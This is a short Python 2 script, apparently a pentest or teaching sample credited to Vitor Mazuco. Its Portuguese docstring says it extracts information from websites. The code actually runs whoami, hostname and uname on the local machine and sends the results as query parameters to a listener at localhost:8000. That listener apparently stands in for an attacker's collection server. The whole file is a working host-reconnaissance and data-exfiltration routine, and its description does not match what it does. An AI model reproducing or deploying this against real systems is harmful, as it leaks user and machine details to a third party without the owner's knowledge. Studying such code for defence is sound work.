#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo tenta
  fazer a extração de informações
  de sites

  Modificado em 09 de janeiro de 2017
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importantando as bibliotecas necessárias
import requests
import urllib
import subprocess
from subprocess import PIPE, STDOUT

# Matriz que queremos usar
commands = ['whoami','hostname','uname']
out = {}

for command in commands:
    try:
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
    except:
        pass

requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))









